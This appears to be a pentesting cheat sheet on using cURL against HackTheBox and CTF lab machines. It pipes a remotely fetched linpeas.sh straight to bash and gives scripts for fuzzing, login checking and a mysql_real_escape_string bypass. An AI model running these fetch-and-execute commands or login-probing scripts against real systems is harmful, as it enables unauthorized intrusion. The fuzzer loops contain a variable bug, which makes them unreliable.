# 1a2 - cURL

cURL (Client URL) is a CLI program used to establish communication with various protocols and retrieve information. It is a good tool for pentesting because it provides raw data from a web application.

```bash
Usage: curl [options...] <url>
 -d, --data <data>           HTTP POST data
 -f, --fail                  Fail fast with no output on HTTP errors
 -h, --help <category>       Get help for commands
 -i, --include               Include response headers in output
 -o, --output <file>         Write to file instead of stdout
 -O, --remote-name           Write output to file named as remote file
 -s, --silent                Silent mode
 -T, --upload-file <file>    Transfer local FILE to destination
 -u, --user <user:password>  Server user and password
 -A, --user-agent <name>     Send User-Agent <name> to server
 -v, --verbose               Make the operation more talkative
 -V, --version               Show version number and quit
```

```
-d is used to insert information into the URL
-H is used to specify HTTP Headers
-X is used to specify the request type (GET, POST, PUT, DELETE...)
- POST create/upload
- PUT replace
- DELETE delete
- GET read
-v print verbose
-i print response header
-I show header only
-u authentication arguments `curl -u admin:admin http://example.com/auth.php`
```

Replacing information in the database using the CRUD API on the website

```bash
curl -X PUT 94.237.53.157:42065/api.php/city/Tbilisi -d '{"city_name":"flag", "country_name":"(HTB)"}' -H 'Content-Type: application/json'
```

### cURL GET parameters

HTTP GET variables can be set by adding them to the URL.

```shell
$ curl http://10.10.10.10/index.php?sessionid=vn0g4d94rs09rgpqga85r9bnia
```

### cURL POST parameters

HTTP POST variables can be set using the -d (--data) parameter.\
Here is a simple login test example:

```shell
$ curl --data "email=test@test.com&password=test" http://10.10.10.10/login.php
```

### cURL COOKIES

cURL has an entire cookie engine that can be used to store and load cookies passed to it from a server between sessions:

```shell
$ curl -b oldcookies.txt -c newcookies.txt http://10.10.10.10/login.php
```

You can also specify your own cookies using the -b parameter:

```shell
$ curl -b "PHPSESSID=vn0g4d94rs09rgpqga85r9bnia" http://10.10.10.10/home.php
```

### cURL User Agents

```shell
$ curl -A "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" http://10.10.10.10/login.php
```

### cURL Save the server response to a file

```shell
$ curl -o payload.sh http://10.10.10.10/payload.sh
```

### cURL download a file to the current folder

```shell
$ curl -O http://10.10.10.10/payload.zip
```

### cURL follow HTTP/1.1 302 Found redirects

```shell
curl -L http://10.10.10.10/profile.php
```

### cURL Output Response Headers to STDOUT

```shell
$ curl -i http://10.10.10.10/profile.php
```

### cURL view verbose debugging information (response headers and other debug details - STD2)

```shell
$ curl -v http://10.10.10.10/profile.php
```

## Hacking with cURL

Now that we have covered the basic syntax and use cases, here are some practical hacking applications that are very helpful on Hackthebox or CTF boxes.

### Using cURL to pipe a remote scipt (linpeas.sh) directly to bash:

```shell
$ curl -sSk "http://10.10.10.10/linpeas.sh" | bash
```

### Attacking a Login Form with cURL

```shell
$ curl --data "email=test@test.com&password=test" http://10.10.10.10/login.php
```

### Creating new users with cURL

```shell
$ curl --data "name=test&email=test@test.com&password=test" http://10.10.10.10/newuser.php
```

## Fuzzing Web Servers with cURL

Often we performing an assessment against a webserver, we will attempt to trigger error conditions which will provide some deeper insights into the underlying processes and software. cURL can be a powerful fuzzing tool for generating these edge case error messages.

### Fuzzing with URI length / GET parameter length limits with cURL

The following script can be used to fuzz a webserver with a long URL track the changes in output and write the output to a file. It is meant to be a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash. You can modify the url to either fuzz a URI or a GET parameter.

Here is the bash shell script:

```shell
#!/bin/bash
echo "args: <URL> <Start Length #> <End Length #> <Output Filepath>"
echo "Length Lines Words Bytes Filename"
echo "---------------------------------"
for ((i = $2; x <= $3; i++))
do
        fuzz=""
        for ((x = 1; x <= $i; x++))
        do
                fuzz+="A"
        done
        #echo "COUNT: $i $fuzz"
        #echo "${1}${fuzz}"
        echo "${i}" | { tr -d '\n' ; curl "${1}${fuzz}" -o ${4} 2>/dev/null | wc ${4}; }
done
```

Here is an example of what it looks like running:

```
./fuzz_url.sh http://10.10.10.10/ 1000 1000000 output.txt
args: <URL> <Start Length #> <End Length #> <Output Filepath>
Length Lines Words Bytes Filename
---------------------------------
1000 9  31 274 output.txt
...
...
100000 11  37 343 output.txt
100001 11  37 343 output.txt
100002 11  37 343 output.txt
100003 11  37 343 output.txt
100004 11  37 343 output.txt
100005 11  37 343 output.txt
```

### Fuzzing POST parameter length limits with cURL

The following script can be used to fuzz a webserver POST parameters and write the output to a file and track changes to that output. It is meant to be a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash.

Here is the bash shell script:

```shell
#!/bin/bash
echo "args: <URL> <Start Length #> <End Length #> <Output Filepath> <Post data: var=value&var2=valuefuzz>"
echo "Length Lines Words Bytes Filename"
echo "---------------------------------"
for ((i = $2; x <= $3; i++))
do
        fuzz=""
        for ((x = 1; x <= $i; x++))
        do
                fuzz+="A"
        done
        #echo "COUNT: $i $fuzz"
        #echo "${5}${fuzz}"
        echo "${i}" | { tr -d '\n' ; curl "${1}" -o ${4} -d "${5}${fuzz}" 2>/dev/null | wc ${4}; }
done

```

Here is an example of what it looks like running:

```
./fuzz_post.sh http://10.10.10.10/ 1000 1000000 output.txt "user=test&password=test"
args: <URL> <Start Length #> <End Length #> <Output Filepath>
Length Lines Words Bytes Filename
---------------------------------
1000 9  31 274 output.txt
...
...
100000 11  37 343 output.txt
100001 11  37 343 output.txt
```

### Check to see if a user login is correct in a Bash script

The following script can be used to verify that a username and login is correct. It is meant to be a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash. It will check the response length characters to see if it is a valid response. You will need to adjust the expected character count for your application.

```shell
#!/bin/bash
result=($(curl --data "email=$2&password=$3" "$1" 2>/dev/null | wc -c))
echo $result
if [ "$result" == '0' ]
then
        echo 'zero'
else
        echo 'NOT zero'
fi
```

Here is the script in action:

```shell
$ ./check_user.sh http://10.10.10.10/login.php test@test.com testpassword
0
NOT zero
```

### Automate user creation and test for mysql\_real\_escape\_string bypass

The following is a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash. Here is a bash script I created for a CTF to validate a theory I had about its use of the PHP mysql\_real\_escape\_string method:

```shell
#!/bin/bash
# Test for mysql_real_escape_string
email=test@test.com
password=1234567890123456789012345678901234567890123456789012345678901234567890123456789
fuzz="뽜’’AA"
name="‘¿’’AA"
ip="10.10.10.10"
echo "Creating User: ${email}"
curl -i -b 'cookies.txt' -c 'cookies.txt' -d "name=${name}&email=${email}&password=${password}&type=Admin" "http://${ip}/index.php" 2>/dev/null
echo " "
echo "============================================"
echo "Login as User"
echo "============================================"
curl -i -c 'cookies.txt' -d "email=${email}&password=${password}&type=Admin" "http://${ip}/index.php" 2>/dev/null  | grep 'location'
echo " "
echo "============================================"
echo "Check user profile with cookie"
echo "============================================"
curl -b 'cookies.txt' "http://${ip}/index.php" -v 2>/dev/null | grep 'td align="center"'
echo " " 
echo "============================================"
echo "Change Name"
echo "============================================"
curl -b 'cookies.txt' -d "name=${fuzz}&type=Admin" "http://${1}/index.php" 
echo " " 
curl -b 'cookies.txt' "http://${ip}/profile.php" 2>/dev/null | grep 'td align="center"'
echo " "
echo " DELETEING COOKIE "
rm cookies.txt
echo "============================================"
echo "Relogin as User - did password change?"
echo "============================================"
curl -i -c 'cookies.txt' -d "email=${email}&password=${password}&type=Admin" "http://${ip}/index.php"  2>/dev/null  | grep 'location'
echo " " 
echo " DONE!"
echo " DELETEING COOKIE "
rm cookies.txt
```
